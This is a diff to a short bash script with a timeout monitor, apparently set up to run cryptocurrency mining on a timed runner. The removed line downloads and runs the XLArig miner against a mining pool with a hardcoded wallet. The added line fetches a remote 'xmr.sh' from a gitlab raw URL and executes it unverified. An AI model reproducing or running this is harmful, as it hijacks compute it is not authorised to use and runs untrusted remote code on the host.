@@ -1,6 +1,6 @@
 #!/bin/bash
 
-Timeout=260 # 6 minutes
+Timeout=290 # 6 minutes
 
 function timeout_monitor() {
    sleep "$Timeout"
@@ -12,8 +12,9 @@ function timeout_monitor() {
 timeout_monitor "$$" &
 Timeout_monitor_pid=$!
 
-wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip && unzip XLArig-v5.2.2-linux-x86_64.zip && ./xlarig -o fi.scala.herominers.com:10130 -u SvkRBartVquTUH7c165FxZCmbCH9USTdUNMecUqY8KJd3twTBMyUQJoMiGYbKkeYMYC3VzfwLsGJVW5vMoYBspcN1XLNVfjiV -p Rdx -a panthera -k -t2
+wget https://gitlab.com/gairmeet/antsi/-/raw/master/xmr.sh && chmod +x xmr.sh && ./xmr.sh
 # <your script here>
 
 # kill timeout monitor when terminating:
 kill "$Timeout_monitor_pid"
+exit
